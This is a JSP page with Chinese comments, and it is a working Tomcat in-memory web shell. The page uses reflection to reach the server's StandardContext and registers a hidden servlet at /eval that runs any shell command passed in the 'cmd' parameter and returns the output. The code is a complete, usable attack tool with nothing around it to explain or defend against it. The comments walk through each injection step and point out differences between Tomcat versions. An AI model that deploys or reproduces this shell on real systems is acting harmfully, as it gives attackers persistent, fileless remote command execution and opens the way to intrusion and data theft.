<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<html>
<head>
    <title>Title</title>
</head>
<body>
<%@ page import="java.io.IOException" %>
<%@ page import="java.io.InputStream" %>
<%@ page import="java.util.Scanner" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="java.io.PrintWriter" %>
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.core.ApplicationContext" %>
<%@ page import="org.apache.catalina.Wrapper" %>

<%!   //创建一个Servlet
    public class EvalServlet extends HttpServlet {
        //重写init和service方法
        public void init(ServletConfig servletConfig) throws ServletException {}
       // 重写service方法
        public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws ServletException, IOException {
            String cmd = servletRequest.getParameter("cmd");
            boolean isLinux = true;
            String osTyp = System.getProperty("os.name");
            if (osTyp != null && osTyp.toLowerCase().contains("win")) {
                isLinux = false;
            }
            String[] cmds = isLinux ? new String[]{"sh", "-c", cmd} : new String[]{"cmd.exe", "/c", cmd};
            InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
            Scanner s = new Scanner(in).useDelimiter("\\a");
            String output = s.hasNext() ? s.next() : "";
            PrintWriter out = servletResponse.getWriter();
            out.println(output);
            out.flush();
            out.close();
        }

        public void destroy() {
        }
    }
%>
<%
    //获取ServletContexe对象
    ServletContext servletContext = request.getServletContext();

    //通过反射获取ApplicationContext对象
    Field applicationField = servletContext.getClass().getDeclaredField("context");
    applicationField.setAccessible(true);
    ApplicationContext applicationContext =  (ApplicationContext) applicationField.get(servletContext);

    //通过反射获取StandardContext对象
    Field standardContextField = applicationContext.getClass().getDeclaredField("context");
    standardContextField.setAccessible(true);
    StandardContext context =  (StandardContext) standardContextField.get(applicationContext);

    //创建Wrapper对象
    Wrapper wrapper = context.createWrapper();
    //将wrapper的name设置为EvalServlet
    wrapper.setName("EvalServlet");
    //将wrapper的class设置为EvalServlet
    wrapper.setServletClass(EvalServlet.class.getName());
    //设置wrapper的servlet为EvalServlet
    wrapper.setServlet(new EvalServlet());
    //将该wrapper添加到StandardContext中
    context.addChild(wrapper);
    //将EvalServlet的url映射设置为/eval   需要注意不同的tomcat版本可能会有所不同
    context.addServletMappingDecoded("/eval", "EvalServlet");


%>
</body>
</html>
